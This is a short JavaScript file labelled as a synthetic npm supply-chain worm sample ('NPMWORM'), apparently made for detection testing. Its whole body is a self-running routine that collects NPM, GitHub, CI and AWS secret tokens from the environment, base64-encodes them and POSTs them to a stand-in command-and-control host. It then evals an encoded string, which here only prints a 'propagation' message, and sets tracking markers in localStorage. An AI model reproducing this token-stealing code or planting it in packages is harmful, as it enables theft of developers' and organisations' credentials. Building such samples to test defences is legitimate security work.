// NPMWORM — synthetic supply-chain worm product sample.
(function () {
  var C2 = 'https://c2.example.test/npm';
  var env = {};
  try {
    ['NPM_TOKEN', 'CI_JOB_TOKEN', 'GITHUB_TOKEN', 'AWS_SECRET_ACCESS_KEY', 'HOME'].forEach(function (key) {
      if (typeof process !== 'undefined' && process.env && process.env[key]) env[key] = process.env[key];
    });
  } catch (error) {}
  var metadata = {
    name: 'example-internal-utils',
    version: '4.19.0',
    registry: 'https://registry.npmjs.org',
    env: env,
    origin: typeof location === 'object' ? location.origin : 'node'
  };
  console.log('[NPMWORM] package context', metadata.name, Object.keys(env).length);
  try {
    fetch(C2, { method: 'POST', body: btoa(JSON.stringify(metadata)) }).catch(function () {});
  } catch (error) {}
  try { eval(atob('Y29uc29sZS5sb2coJ1tOUE1XT1JNXSBwcm9wYWdhdGlvbiBtb2R1bGUgZXhlY3V0ZWQnKQ==')); } catch (error) {}
  try {
    localStorage.setItem('npmworm:package', metadata.name + '@' + metadata.version);
    localStorage.setItem('npmworm:tokens', String(Object.keys(env).length));
  } catch (error) {}
})();
